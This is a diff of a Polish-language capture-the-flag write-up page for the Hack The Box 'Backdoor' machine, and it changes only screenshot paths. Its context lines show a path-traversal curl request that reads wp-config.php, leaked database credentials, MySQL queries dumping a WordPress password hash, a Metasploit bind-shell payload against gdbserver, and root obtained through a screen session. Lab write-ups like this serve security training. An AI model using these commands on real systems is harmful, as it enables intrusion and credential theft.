@@ -270,7 +270,7 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre></div><hr>
 <h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211122222143.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211122222143.png" alt=""  />
 </p>
 <p>Strona wygląda na Wordpress.</p>
 <hr>
@@ -282,15 +282,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  | Location: http://backdoor.htb/wp-content/themes/twentyseventeen/
  | Latest Version: 2.8 (up to date)
  | Last Updated: 2021-07-22T00:00:00.000Z
-</code></pre><p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211122224936.png" alt=""  />
+</code></pre><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211122224936.png" alt=""  />
 </p>
 <p>Zatem wiadomo, że na Wordpressie jest użytkownik <code>admin</code></p>
 <hr>
 <h2 id="enumeracja-folderu-plugins">Enumeracja folderu <code>plugins</code><a hidden class="anchor" aria-hidden="true" href="#enumeracja-folderu-plugins">#</a></h2>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211122231839.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211122231839.png" alt=""  />
 </p>
 <p>Plugin <code>ebook-download</code>. Możliwe, że zawiera ciekawe informacje.</p>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211122231715.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211122231715.png" alt=""  />
 </p>
 <hr>
 <h2 id="informacje">Informacje<a hidden class="anchor" aria-hidden="true" href="#informacje">#</a></h2>
@@ -303,14 +303,14 @@ Tested up to: 4.4
 Stable tag: 1.1</p>
 <hr>
 <p>Szybkie googlowanie w poszukiwaniu potencjalnych exploitów na plugin <code>ebook-downloader</code></p>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211123200137.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211123200137.png" alt=""  />
 </p>
 <p>I jest potencjalny exploit</p>
 <p><a href="https://www.exploit-db.com/exploits/39575">https://www.exploit-db.com/exploits/39575</a></p>
 <hr>
 <h1 id="lfi">LFI<a hidden class="anchor" aria-hidden="true" href="#lfi">#</a></h1>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl http://10.129.106.242/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span style="color:#f92672">=</span>../../../wp-config.php
-</code></pre></div><p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211124212712.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211124212712.png" alt=""  />
 </p>
 <p><code>wordpressuser:MQYBJSaD#DxG6qbm</code></p>
 <h2 id="etcpasswd">/etc/passwd<a hidden class="anchor" aria-hidden="true" href="#etcpasswd">#</a></h2>
@@ -321,20 +321,20 @@ Stable tag: 1.1</p>
 </code></pre></div><p>Plik oczyściłem tak, by uzyskać jedynie nazwy uruchomionych procesów</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat procesy.txt | awk <span style="color:#e6db74">&#39;{print $2}&#39;</span> | sort -u &gt; procesy.txt
 </code></pre></div><p>Googlowanie nietypowych nazw w końcu dało jakiś rezultat</p>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211124033955.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211124033955.png" alt=""  />
 </p>
 <p>Wynika z tego, że na serwerze jest uruchomiony <code>gdbserver</code></p>
 <hr>
 <p>Okazuje się, że pod  <code>portem 1337</code> znajduje się właśnie ta usługa.</p>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211124035000.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211124035000.png" alt=""  />
 </p>
 <hr>
 <h2 id="próby-exploitu-gdbserver">Próby exploitu <code>gdbserver</code><a hidden class="anchor" aria-hidden="true" href="#próby-exploitu-gdbserver">#</a></h2>
 <p>Użyłem Metasploit z modułem <code>multi/gdb/gdb_server_exec</code>.  Z uwagi, że jestem w miejscu gdzie jest firewall, musiałem ustawić inny payload niż zwykle:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">set payload linux/x64/shell/bind_tcp
-</code></pre></div><p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211124204622.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211124204622.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211124204951.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211124204951.png" alt=""  />
 </p>
 <p>user.txt</p>
 <p><code>8af3bf9ba355001010d38211b1897f5f</code></p>
@@ -348,10 +348,10 @@ Stable tag: 1.1</p>
 <hr>
 <h2 id="baza-mysql-cli">Baza MySql (cli)<a hidden class="anchor" aria-hidden="true" href="#baza-mysql-cli">#</a></h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mysql -u wordpressuser --password<span style="color:#f92672">=</span>MQYBJSaD#DxG6qbm -D wordpress -e <span style="color:#e6db74">&#39;show databases;&#39;</span>
-</code></pre></div><p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211124212926.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211124212926.png" alt=""  />
 </p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mysql -u wordpressuser --password<span style="color:#f92672">=</span>MQYBJSaD#DxG6qbm -D wordpress -e <span style="color:#e6db74">&#39;select * FROM wp_users;&#39;</span>
-</code></pre></div><p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211124213136.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211124213136.png" alt=""  />
 </p>
 <p><code>admin:$P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5.</code></p>
 <hr>
@@ -362,7 +362,7 @@ Stable tag: 1.1</p>
 </code></pre></div><p>Teraz wpisując</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">screen -x root/
 </code></pre></div><p>Uzyskujemy roota</p>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020211124230026.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020211124230026.png" alt=""  />
 </p>
 <p>root.txt</p>
 <p><code>4cf8759e22af263a555dc9289caacf1d</code></p>
